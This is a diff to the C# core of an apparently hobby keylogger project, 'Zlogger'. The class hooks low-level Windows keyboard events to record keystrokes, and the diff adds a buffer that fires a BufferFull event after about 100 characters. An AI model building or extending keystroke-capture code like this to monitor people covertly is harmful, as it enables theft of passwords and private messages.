@@ -1,6 +1,7 @@
 ﻿using Rodjenihm.Zlogger.WinAPI;
 using System;
 using System.Runtime.InteropServices;
+using System.Text;
 
 namespace Rodjenihm.Zlogger.Core
 {
@@ -8,8 +9,8 @@ namespace Rodjenihm.Zlogger.Core
     {
         private readonly LowLevelKeyboardHook hook;
         private readonly HOOKPROC keyboardHookProc = null;
-        public string LogPath { get; set; } = string.Empty;
-
+        public string LogDir { get; set; } = string.Empty;
+        public StringBuilder Buffer { get; } = new StringBuilder();
 
         public Keylogger()
         {
@@ -23,15 +24,21 @@ namespace Rodjenihm.Zlogger.Core
 
                     if (wParam == (IntPtr)WindowsMessages.WM_KEYDOWN) OnKeyDown(this, keyEventArgs);
                     if (wParam == (IntPtr)WindowsMessages.WM_KEYUP) OnKeyUp(this, keyEventArgs);
+
+                    if (Buffer.Length > 100)
+                    {
+                        OnBufferFull(this);
+                        Buffer.Clear();
+                    }
                 }
 
                 return hook.NextHook(nCode, wParam, lParam);
             };
         }
 
-        public Keylogger(string logPath) : this()
+        public Keylogger(string logDir) : this()
         {
-            LogPath = logPath;
+            LogDir = logDir;
         }
 
         public void Run()
@@ -45,17 +52,23 @@ namespace Rodjenihm.Zlogger.Core
             hook.RemoveHook();
         }
 
-        public event EventHandler<KeyEventArgs> KeyDown;
-        public event EventHandler<KeyEventArgs> KeyUp;
+        public event Action<Keylogger, KeyEventArgs> KeyDown;
+        public event Action<Keylogger, KeyEventArgs> KeyUp;
+        public event Action<Keylogger> BufferFull;
 
-        protected virtual void OnKeyDown(object sender, KeyEventArgs e)
+        protected virtual void OnKeyDown(Keylogger sender, KeyEventArgs e)
         {
             KeyDown?.Invoke(sender, e);
         }
 
-        protected virtual void OnKeyUp(object sender, KeyEventArgs e)
+        protected virtual void OnKeyUp(Keylogger sender, KeyEventArgs e)
         {
             KeyUp?.Invoke(sender, e);
+        }
+
+        protected virtual void OnBufferFull(Keylogger keylogger)
+        {
+            BufferFull?.Invoke(keylogger);
         }
     }
 }
